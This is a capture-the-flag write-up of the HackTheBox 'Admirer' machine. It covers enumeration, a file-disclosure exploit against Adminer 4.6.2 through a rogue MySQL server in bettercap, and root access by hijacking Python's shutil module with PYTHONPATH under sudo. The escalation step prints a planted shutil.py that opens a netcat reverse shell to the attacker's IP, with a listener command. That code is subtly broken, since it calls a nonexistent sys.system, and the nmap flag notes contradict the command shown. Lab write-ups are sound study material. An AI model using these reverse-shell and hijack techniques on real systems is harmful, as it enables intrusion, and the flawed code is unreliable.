## **Introduction**

HackTheBox Admirer is linux based easy box which was really awesome to pwn. The foothold was pretty awesome. We have to get the cerdential of user by exploiting a CVE if admirer. For Getting root priviliges we have to hijack the python module path to get the root shell. So let's begin.

# **Enumeration**

First thigs first let's run the nmap scan on the machine to reveal open ports and services running in the machine. So let's do it.

### Nmap Scan

`sudo nmap -sC -sV -O -oN nmap/admirer 10.10.10.187`

``` 
 -sC : Perform nmap scan using default scripts (NOTE: You can use specific lua scripts to perform custom scans, please refer to man page)
 -sV : Try to get the version of the services running in the system (NOTE: It does not return version of unknown services)
 -O  : Operating System fingerprinting/Tries to guess which OS is running in the system
 -oA : Output in all format inside nmap folder with name buff
```

We got the nmap output. Let's examin it.

We have got 3 ports open. port `21/tcp` is ftp whose version is `vsftpd 3.0.3`, port `22/tcp` which is SSH and last but not least port `80/tcp` which is running apache server `2.4.25`.
Since these services are latest versions there is very low possibility to find exploit for vsftpd, OpenSSH and Apache.

It also reveals that there is and `/admin-dir` directory is present in the root directory of the apache server. Hmm that's intresting.

So let's visit the web page and see what it has to offer.

### Visiting Port 80

When we visit the port 80 we see this beautiful webpage in front of us.

![image](webpage of the admirer)

The first thing which i always do is look for robots.txt and see if there is something intresting or not.

![image](robots.txt of admirer)

So we there we have `/admin-dir` directory and there is some note written. Let's take a look ar it. It says 

> The folder contains personal contacts and creds, so no -not even robots- should see it -waldo

Ok so We get an idea that this `admin-dir` folder contains creds and contact of users. So let's visit it.

On visiting we see that we are forbidden to to watch content of this directory. Now there are two ways either you can use gobuster or dirbuster to bruteforce ot you can do some hit and trial method. I got these files using guess work since we got idea what kind of files are present inside this directory.

In the note it was written that contact and creds are inside this directory so most probabily it must be saved in `.txt` file and name of those file can be something like contact, cred, crediential, credientials etc. etc.. So after some guess work I found that two files present inside the directory are `contacts.txt` and `credientials.txt`.

You can bruteforce also but it will take some time. So let's see what these files have.

![image](contacts.txt)
![image](credientials.txt)

`contacts.txt` doesn't have many intresting info apart from names of persons. Let's take a look at `credientials.txt`. There are lot of creds which can be useful to us. For now we are inrested in FTP creds since we saw in nmap that FTP is listening in port `21/tcp`.

Let's login using the FTP creds. We get the successful login. On basic enumeration we see that there are two files present in the ftp.

![image](ftp image)

One is a `dump.sql` and other is `html.tar.gz`. Let's download both the file to out machine.

> To download from ftp to out local machine use command `get <filename>`.

First let's take a look at `dump.sql`. `dump.sql` doesn't reveal any intresting information. So let's move to `html.tar.gz`.

First decompress the file using command 

`gunzip -d html.tar.gz`

Next extract the file from `html.tar` using the following command

`tar -xvf html.tar`

Now we get a `html` folder. Let's take a look inside. On Looking at it it looks like a backup of the website running in port `80/tcp`.

On looking at index.php we see waldo's credientials. On trying the credientials on ssh and ftp it lead me to dead end. Maybe the credientials are changed since this is the backup folder.

We can see that insted of `W4ld0s_s3cr3t_d1r` we get `admin-dir` in our present running website. We can see that a directory name `utility-scripts` is present in our backup. Inside we see that there are php scripts present inside the directory. If we will try to access `utility-scripts` directory in our running webiste we get a hit but it's forbidden but we know the file names present inside the directory. On testing whether the files are present or not we see that all the files are present except `db_admin.php`. Let's take a look at it.

![image](db_admin.php)

We see in the end of script the developer have writen something. So we should assume that he didn't finished this `db_admin.php` and must have found some alternative for this. On researching I found [`Adminer`](https://www.adminer.org/). The name of the box was a hint to find this.

Now we are sure that `Adminer` is present. Let's try to visit it's home page inside `utility-scripts` directory by searching for `adminer.php`. Bingo!.. We see the homepage.

# **FootHold**

Now we see that it's `Adminer 4.6.2`. On searching a bit for vulnerabilities i found [this](https://www.acunetix.com/vulnerabilities/web/adminer-4-6-2-file-disclosure-vulnerability/).

This version of Adminer is vulnerable to file disclosure which can be exploited by following steps.

1. Set up a rouge sql server in your local machine
2. Make Adminer connect to your rouge sql server
3. On connection send `LOAD DATA INFILE` SQL command
4. Boom you got content of the file.

So let's start with setting up the rouge sql server. You can do it from scratch if you want but for now i'm gonna use [`bettercap`](https://github.com/bettercap/bettercap) which does most of the work for us. So download the bettercap and let's exploit it.

We are going to use `mysql.server` module present in bettercap. you can learn more about it by typing `help mysql.server` in bettercap. Type the following command in bettercap to set up a rouge server.

1. `set mysql.server.address <your tun0 IP address>` (setting the address to serve rougue sql server)
2. `set mysql.server.infile ../index.php` (setting the file to read)
3. `mysql.server on` (starting the sql server)

Now go to `adminer.php` and try connecting to our sql server.

![image](connecting to sql server)

and press login.

On successful exploitation you will see something like this in your bettercap terminal.

Awesome now we get the credientials of waldo. So let's try accessing the ssh using the credientials we got

`ssh waldo@10.10.10.187`

![image](ssh waldo terminal)

and we are in. (typical movie dialog when hacker get's into machine LOL)

# **Privelege Escilation**

Now let's move for root privileges. Whenever you have logged in as any user of the machine with his/her creds. Try looking at their sudo privileges by typing command.

`sudo -l`

![image](sudo priv)

We see that the user can run `admin_tasks.sh` as root. Let's see what's inside the script. After analysing the script the `backup_web()` was looking intresting. It was running `backup.py` file which was present in the same directory. Let's look at `backup.py`.

![image](backup)

We see that the python script is importing `shutil` and using `make_archive_function`. After googling a bit i found this [`blog`](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8). Try reading the article especially the last section.

So I hope you read the article on module hijacking. So let's get started.

First create a `fakelib` directory in `/tmp` 

Second create `shutil.py` in `/tmp/fakelib` directoy with the following code

```
import sys

def make_archive_function(arg1, arg2, arg3) :
    sys.system('/bin/nc -e /bin/sh <your tun0 IP address> 9001')
```

Now let's set up a listener in port 9001 in our localmachine.

`nc -nvlp 9001`

Now let's do the magic. According to the article we see that we have `SETENV` tag enabled. So we can make python look for `shutil` module in the `/tmp` directory insted of its usual directories. Type the following command

`sudo PYTHONPATH=/tmp/fakelib /opt/scripts/admin_tasks.sh`

and choose the `Backup web data` option.

On successful exploitation you will get the shell on your listening port as shown below.
